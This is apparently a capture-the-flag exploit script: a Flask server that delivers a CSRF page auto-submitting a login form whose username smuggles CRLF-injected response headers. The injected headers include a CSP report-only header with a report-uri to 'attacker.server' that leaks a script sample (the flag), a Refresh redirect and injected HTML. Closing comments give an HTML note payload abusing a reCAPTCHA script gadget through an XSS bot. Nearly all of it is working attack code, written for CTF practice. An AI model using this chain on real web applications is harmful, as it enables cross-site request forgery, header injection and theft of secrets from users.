from flask import *
from base64 import *

app = Flask(__name__)

app.debug = True

public_host = "http://attacker.server"  # your accessible public ip/domain for this server, no slash
target = "http://web"  # target ip/domain (from bot's perspective), no slash

html = """
<template id="note-tmpl">
<span class="note-title"></span>
<span class="note-author"></span>
<script class="note-content"></script>
</template>
<div id="notes-container"></div>
<div id="add-btn"></div>
<div id="title"></div>
<div id="content"></div>
<div id="logout-btn"></div>
<div id="share-btn"></div>
<script src="/js/purify.min.js"></script>
<script src="/js/marked.min.js"></script>
<script src="/js/app.js"></script>
pekopekopekopekopekopeko
"""

payload = f"""peko; path=/dummy\r
Content-Security-Policy-Report-Only: script-src 'report-sample'; report-uri {public_host}/flag\r
Refresh: 5; url=/konnene\r
Content-Type: text/html\r
Content-Length: {len(html)}\r
\r
{html}""".encode()


@app.route("/csrf")
def csrf():
    return f"""
<form action="{target}/login" method=post id=f>
<textarea name=username id=username>
</textarea>
<input name=password value=pekomiko>
<input type=submit>
</form>
<script>
const payload = atob("{b64encode(payload).decode()}")
username.value = payload
f.submit()
</script>
"""

@app.route("/flag", methods=["POST"])
def flag():
    if "csp" in request.content_type:
        j = request.get_json(force=True)
        sample = j["csp-report"]["script-sample"]
        if len(sample) > 0:
            app.logger.critical(sample)
    return "kusapeko"


app.run(port=8000)

# create a note with the following content:
"""
<form action="http://IP_OF_THIS_SERVER/csrf" id="logout-form">
<button type=submit class=g-recaptcha data-sitekey=invalid data-error-callback=logout data-action=submit>asd</button>
</form>
"""
# then submit your page to xss bot then it will trigger a redirect to your server
# then csrf and get flag using script gadget + csp report
